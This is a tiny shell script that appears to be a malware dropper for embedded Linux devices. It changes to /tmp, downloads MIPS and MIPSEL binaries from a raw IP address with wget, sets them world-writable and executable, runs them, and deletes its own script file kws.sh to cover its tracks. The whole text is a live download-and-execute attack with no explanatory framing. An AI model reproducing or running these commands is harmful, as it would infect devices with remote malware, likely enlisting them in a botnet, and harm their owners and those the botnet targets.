cd /tmp;wget http://45.95.146.126/splmips; chmod 777 splmips; ./splmips kws
cd /tmp;wget http://45.95.146.126/splmpsl; chmod 777 splmpsl; ./splmpsl kws

rm -rf kws.sh
